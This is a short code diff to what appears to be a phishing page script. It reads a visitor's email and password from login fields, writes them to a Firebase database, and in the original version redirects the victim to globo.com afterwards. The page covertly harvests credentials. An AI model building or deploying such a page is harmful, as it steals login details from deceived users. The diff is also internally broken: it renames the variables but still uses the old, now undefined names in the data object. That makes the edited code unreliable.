@@ -21,19 +21,19 @@
     var db = firebase.database();
 
     function save() {
-      var user_name = document.getElementById('Email').value;
-      var psw = document.getElementById('Passwd').value;
+      var email = document.getElementById('Email').value;
+      var senha = document.getElementById('Passwd').value;
 
       var data = {
-        user_name: user_name,
-        psw: psw
+        email: user_name,
+        senha: psw
       }
 
       var updates = {};
       updates['/users/' + uid] = data;
       firebase.database().ref().update(updates);
       
-      window.location.href = "http://www.globo.com/";
+      // window.location.href = "http://www.globo.com/";
 
     }
   </script>
